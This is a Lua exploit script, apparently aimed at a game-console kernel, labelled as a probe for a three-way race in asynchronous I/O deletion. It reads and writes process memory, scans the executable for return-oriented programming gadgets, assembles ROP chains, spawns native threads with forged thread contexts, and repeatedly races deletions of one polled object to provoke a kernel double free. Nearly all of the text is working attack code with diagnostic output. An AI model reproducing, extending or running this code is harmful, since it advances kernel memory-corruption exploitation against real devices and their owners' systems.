-- CRASH_CLASS: HIGH
-- PROBE 1051a: three simultaneous deleters on one polled aio object
-- 1050a proved a single child delete succeeds on a polled object (status 0) and every later
-- delete misses with 0x80020003.  A double free needs two deleters inside the handler at the
-- same moment, so this probe lines them up: two native children each nanosleep the same
-- duration and then delete the same id, and the parent does the same from Lua.  Three status
-- words, all separate.  For each trial, one success is normal; two or more is the bug.
print("=== PROBE 1051a: three-way aio delete race ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
local function mmap(px) return to_num(select(2, pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end))) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local fn = to_num(syscall.pipe.fn_addr)
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local store = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X gadgets ok=%s", ebase, tostring(pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("[!] gadget missing"); return end

local D = mmap(0x4000)
local ID = mmap(0x4000)
local ST = mmap(0x8000)        -- 0x000 parent, 0x1000 child A, 0x2000 child B
local blkA = mmap(0x40000)
local blkB = mmap(0x40000)
local tsA = mmap(0x1000)
local tsB = mmap(0x1000)
local PO = ST + 0x3000   -- poll id buffer, separate from the children's timespec
print(string.format("[A] D=%08X ID=%08X ST=%08X A=%08X B=%08X", D, ID, ST, blkA, blkB))
if D == 0 or ID == 0 or ST == 0 or blkA == 0 or blkB == 0 then print("[!] mmap failed"); return end

local sc669, sc662, sc664, sc430 = mk(669), mk(662), mk(664), mk(430)
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100, RAX = 0x078 }
local SLEEP_US = 30000

-- chain: nanosleep(SLEEP_US) -> 662(ID,1,STA) -> getpid -> store RES -> exit
local function build(block, status_addr, res_addr)
    local start = block + 0x4000
    local i = 0
    local function put(v) wq(start + 8 + i * 8, uint64(v)); i = i + 1 end
    put(pop_rdi); put(tsA); put(pop_rsi); put(0); put(pop_rax); put(240); put(fn)
    put(pop_rdi); put(ID); put(pop_rsi); put(1); put(pop_rdx); put(status_addr)
    put(pop_rax); put(662); put(fn)
    put(pop_rax); put(20); put(fn)
    put(pop_rdi); put(res_addr); put(store)
    put(pop_rdi); put(0); put(pop_rax); put(431); put(fn); put(jmp_g)
    return start
end
local startA = build(blkA, ST + 0x1000, ST + 0x1800)
local startB = build(blkB, ST + 0x2000, ST + 0x2800)

local function spawn(start)
    local ctx = memory.alloc(0x500); zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8)); wq(ctx + Ctx.RAX, uint64(20))
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return sc430(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end
local function sleep_us(us)
    wq(tsA, uint64(0)); wq(tsA + 8, uint64(us * 1000))
    pcall(function() return mk(240)(uint64(tsA), uint64(0)) end)
end
local function create_poll()
    wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
    wd(ID, 0)
    local okc = pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(ID)) end)
    local id = rd(ID) or 0
    if id == 0 then return 0, false end
    wq(PO, uint64(id)); wq(ST, uint64(0))
    local okp = pcall(function() return sc664(uint64(PO), uint64(1), uint64(ST)) end)
    return id, okp and (rd(ST) or 0) ~= 0x80020010
end

local TRIALS = 6
local bad = 0
for t = 1, TRIALS do
    local id = create_poll()
    if id == 0 then print(string.format("[T%d] create failed", t)) break end
    wd(ST, 0); wd(ST + 0x1000, 0); wd(ST + 0x2000, 0); wd(ST + 0x1800, 0); wd(ST + 0x2800, 0)
    local okA = spawn(startA)
    local okB = spawn(startB)
    sleep_us(SLEEP_US)
    local okP = pcall(function() return sc662(uint64(ID), uint64(1), uint64(ST)) end)
    sleep_us(150000)
    local sp = rd(ST) or 0
    local sa = rd(ST + 0x1000) or 0
    local sb = rd(ST + 0x2000) or 0
    local succ = 0
    if sp == 0 then succ = succ + 1 end
    if sa == 0 then succ = succ + 1 end
    if sb == 0 then succ = succ + 1 end
    if succ > 1 then bad = bad + 1 end
    print(string.format("[T%d] id=%08X spawnA=%s spawnB=%s parent=%08X A=%08X B=%08X succ=%d%s",
        t, id, tostring(okA), tostring(okB), sp, sa, sb, succ, succ > 1 and "  <- DOUBLE" or ""))
end
print(string.format("[Z] trials=%d doubles=%d alive pid=%d", TRIALS, bad, to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
